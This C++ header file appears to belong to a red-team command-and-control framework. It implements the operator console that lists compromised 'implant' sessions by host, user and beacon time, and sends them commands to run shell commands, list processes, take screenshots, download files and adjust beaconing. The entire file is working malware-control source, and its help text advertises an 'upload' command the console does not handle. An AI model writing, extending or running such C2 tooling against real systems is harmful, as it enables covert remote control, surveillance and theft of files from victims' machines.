#pragma once
#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <thread>
#include "Listener.h"
#include "CommandDispatcher.h"
#include "../Common/Protocol.h"

namespace Console {
    inline uint32_t current_session = 0;

    inline void print_banner() {
        std::cout << R"(
╔══════════════════════════════════════════════╗
║         RED TEAM C2 SERVER v2.0              ║
║         Isolated Environment Mode            ║
╚══════════════════════════════════════════════╝
)" << std::endl;
    }

    inline void print_help() {
        std::cout << R"(
Available commands:
  sessions              List active implant sessions
  interact <id>         Interact with a session
  background            Return to session list
  shell <command>       Execute shell command on target
  ps                    List processes on target
  screenshot            Capture screenshot from target
  download <path>       Download file from target
  upload <local> <rem>  Upload file to target
  sleep <ms>            Change beacon interval
  exit                  Terminate implant session
  quit                  Exit C2 server
  help                  Show this help
)" << std::endl;
    }

    inline void list_sessions() {
        std::lock_guard<std::mutex> lock(C2Listener::g_listener.sessions_mutex);
        if (C2Listener::g_listener.sessions.empty()) {
            std::cout << "[*] No active sessions.\n";
            return;
        }
        std::cout << "\nID\tHost\t\tUser\t\tLast Beacon\n";
        std::cout << "--\t----\t\t----\t\t-----------\n";
        for (const auto& pair : C2Listener::g_listener.sessions) {
            uint32_t id = pair.first;
            const auto& session = pair.second;
            if (session.active) {
                uint32_t elapsed = GetTickCount() - session.last_beacon;
                std::cout << id << "\t"
                    << session.hostname << "\t"
                    << session.username << "\t"
                    << elapsed / 1000 << "s ago\n";
            }
        }
        std::cout << std::endl;
    }

    inline void interactive_shell() {
        std::string line;
        while (true) {
            std::cout << "C2> ";
            std::getline(std::cin, line);
            if (line.empty()) continue;

            std::istringstream iss(line);
            std::string cmd;
            iss >> cmd;

            if (cmd == "quit") {
                C2Listener::g_listener.running = false;
                break;
            }
            else if (cmd == "sessions") {
                list_sessions();
            }
            else if (cmd == "interact") {
                uint32_t id = 0;
                iss >> id;
                if (id > 0) {
                    current_session = id;
                    CommandDispatcher::active_session_id = id;
                    std::cout << "[*] Interacting with session #" << id << "\n";
                }
            }
            else if (cmd == "background") {
                current_session = 0;
                CommandDispatcher::active_session_id = 0;
                std::cout << "[*] Returned to session list.\n";
            }
            else if (cmd == "shell") {
                std::string command;
                std::getline(iss, command);
                if (!command.empty() && command[0] == ' ') command = command.substr(1);
                if (!command.empty() && current_session > 0) {
                    CommandDispatcher::cmd_shell(current_session, command);
                }
                else {
                    std::cout << "[!] No session selected.\n";
                }
            }
            else if (cmd == "ps") {
                if (current_session > 0) {
                    CommandDispatcher::cmd_ps(current_session);
                }
                else {
                    std::cout << "[!] No session selected.\n";
                }
            }
            else if (cmd == "screenshot") {
                if (current_session > 0) {
                    CommandDispatcher::cmd_screenshot(current_session);
                }
                else {
                    std::cout << "[!] No session selected.\n";
                }
            }
            else if (cmd == "download") {
                std::string path;
                std::getline(iss, path);
                if (!path.empty() && path[0] == ' ') path = path.substr(1);
                if (!path.empty() && current_session > 0) {
                    CommandDispatcher::cmd_download(current_session, path);
                }
                else {
                    std::cout << "[!] No session selected.\n";
                }
            }
            else if (cmd == "sleep") {
                uint32_t ms = 0;
                iss >> ms;
                if (ms > 0 && current_session > 0) {
                    CommandDispatcher::cmd_sleep(current_session, ms);
                }
                else {
                    std::cout << "[!] Invalid input or no session.\n";
                }
            }
            else if (cmd == "exit") {
                if (current_session > 0) {
                    CommandDispatcher::cmd_exit(current_session);
                    current_session = 0;
                    CommandDispatcher::active_session_id = 0;
                }
            }
            else if (cmd == "help") {
                print_help();
            }
            else {
                std::cout << "[!] Unknown command. Type 'help' for available commands.\n";
            }
        }
    }
}